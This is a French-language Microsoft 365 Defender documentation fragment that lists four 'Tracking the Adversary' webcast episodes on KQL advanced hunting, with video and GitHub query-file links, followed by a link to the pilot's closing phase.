|Épisode 1 : Principes de base du langage KQL|Nous allons couvrir les principes de base des fonctionnalités de recherche avancées dans Microsoft 365 Defender. Découvrez les données de recherche avancées disponibles, ainsi que la syntaxe et les opérateurs KQL de base.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[Épisode 1 : Fichier CSL dans Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|Épisode 2 : Joints|Nous continuerons à apprendre à connaître les données dans le recherche avancée et comment joindre des tables. Découvrez les jointeurs internes, externes, uniques et semi-joints, ainsi que les nuances de la jointage interne Kusto par défaut.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[Épisode 2 : Fichier CSL dans Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|Épisode 3 : Synthèse, pivotation et visualisation des données|Maintenant que nous sommes en mesure de filtrer, manipuler et joindre des données, il est temps de commencer à récapituler, quantifier, pivoter et visualiser. Dans cet épisode, nous allons couvrir l’opérateur de synthèse et certains des calculs que vous pouvez effectuer lors de la plonger dans des tableaux supplémentaires dans le schéma de recherche avancé. Nous transformeons nos jeux de données en graphiques qui peuvent vous aider à améliorer l’analyse.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[Épisode 3 : Fichier CSL dans Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|Épisode 4 : Nous allons faire la recherche ! Application de KQL au suivi des incidents|Il est temps de suivre une activité de l’attaquant ! Dans cet épisode, nous allons utiliser notre compréhension améliorée du KQL et du Microsoft 365 Defender pour suivre une attaque. Découvrez quelques conseils et astuces utilisés dans le champ pour suivre l’activité des personnes malveillantes, notamment les stratégies de sécurité en cas de cyber-sécurité et comment les appliquer à la réponse aux incidents.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[Épisode 4 : Fichier CSL dans Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>Étape suivante

|![Phase de fermeture et de résumé](../../media/mtp/close.png) <br>[Phase de fermeture et de résumé](m365d-pilot-close.md)|Analysez votre Microsoft 365 Defender pilote, présentez-les à vos parties prenantes et faites l’étape suivante.
|:-----|:-----|
